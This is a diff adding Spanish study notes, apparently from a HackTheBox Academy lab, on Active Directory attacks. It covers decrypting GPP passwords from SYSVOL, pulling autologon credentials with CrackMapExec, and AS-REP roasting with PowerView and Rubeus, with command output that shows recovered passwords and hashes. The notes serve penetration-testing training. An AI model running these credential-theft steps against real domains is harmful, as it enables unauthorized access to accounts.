@@ -4309,4 +4309,82 @@ Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 
 ##### GPP Passwords
 
-Cuando se crea un GPP, se crea un archivo XML en el share SYSVOL, 
+Cuando se crea un GPP, se crea un archivo XML en el share SYSVOL, que está cacheado localmente en endpoints para los que aplica la política de grupo. Estos archivos pueden incluir aquellos usados para:
+- drives.xml
+- Crear usuarios locales
+- Crear archivos de configuración de impresora (_printers.xml_)
+- Crear y actualizar servicios (_services.xml_)
+- Crear tareas programadas (_scheduledtasks.xml_)
+- Cambiar contraseñas de administradores locales
+
+Los archivos **Groups.xml** en **SYSVOL** pueden contener contraseñas cifradas con AES-256, pero Microsoft publicó la clave para descifrarlas, y cualquier usuario autenticado puede leerlos. Aunque se parchó en 2014 (MS14-025) para impedir guardar contraseñas en GPP, los archivos antiguos permanecen accesibles y siguen siendo una fuente de credenciales.
+
+![[Pasted image 20251114115937.png]]
+
+Podemos utilizar `gpp-decrypt` para descifrar la contraseña que aparece en dicho XML:
+
+```shell-session
+amr251@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+Password1
+```
+
+Las contraseñas de **GPP** pueden extraerse desde **SYSVOL** manualmente o con herramientas como `Get-GPPPassword.ps1`, módulos de Metasploit o **CrackMapExec**. A veces pertenecen a cuentas antiguas o bloqueadas, pero vale la pena probarlas en ataques de _password spraying_, ya que la reutilización de contraseñas es común y puede dar acceso adicional.
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb -L | grep gpp
+
+[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+```
+
+Cuando el **autologon** se configura por directiva de grupo, las credenciales quedan en **Registry.xml** dentro de **SYSVOL**, legibles por cualquier usuario de dominio. Microsoft no lo ha bloqueado, por lo que pueden extraerse con **CrackMapExec (gpp_autologin)** o **Get-GPPAutologon.ps1**.
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+##### ASREPRoasting
+
+Si una cuenta tiene desactivada la **preautenticación Kerberos**, cualquier usuario del dominio puede solicitar su **TGT** cifrado con la contraseña de esa cuenta y luego crackearlo offline con **Hashcat** o **John the Ripper**. Es común en cuentas de servicio mal configuradas por proveedores.
+
+```powershell-session
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+También podemos hacer esto utilizando la herramienta `Rubeus`:
+
+```powershell-session
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D1...
+```
+
+Y luego, con el módulo `18200`, descifrar el hash con Hashcat.
+
